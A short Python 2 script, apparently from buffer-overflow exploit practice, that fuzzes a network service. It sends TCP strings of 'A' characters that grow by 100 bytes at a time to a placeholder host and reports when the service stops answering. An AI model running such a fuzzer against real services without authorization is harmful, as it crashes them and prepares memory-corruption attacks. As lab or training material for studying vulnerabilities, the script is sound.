#!/usr/bin/python
import socket
 
buffer=["A"]
counter=100
 
while len(buffer) <= 60:
    buffer.append("A"*counter)
    counter=counter+100
 
try:
    for string in buffer:
        print "Fuzzing with %s bytes" % len(string)
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect(('ip_address',port))
        s.recv(1024)
        s.send(string + '\r\n')
        s.close()
 
except:
    print "Could not connect to application! Crash?"

